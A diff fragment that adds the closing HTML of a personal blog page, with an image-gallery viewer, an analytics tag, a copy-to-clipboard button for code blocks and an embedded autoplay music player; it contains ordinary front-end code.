+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+
+
+
+
+<script type="text/javascript" src="https://js.users.51.la/20544303.js"></script>
+
+  
+<script src="/js/clickLove.js"></script>
+
+
+
+<!-- 复制 -->
+
+  
+<link rel="stylesheet" href="/css/clipboard.css">
+
+  <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+
+
+    
+    <div id="music">
+    
+    
+    
+    <iframe frameborder="no" border="1" marginwidth="0" marginheight="0" width="200" height="52"
+        src="//music.163.com/outchain/player?type=2&id=27927357&auto=1&height=32"></iframe>
+</div>
+
+<style>
+    #music {
+        position: fixed;
+        right: 15px;
+        bottom: 0;
+        z-index: 998;
+    }
+</style>
+    
+  </div>
+</body>
+
+</html>
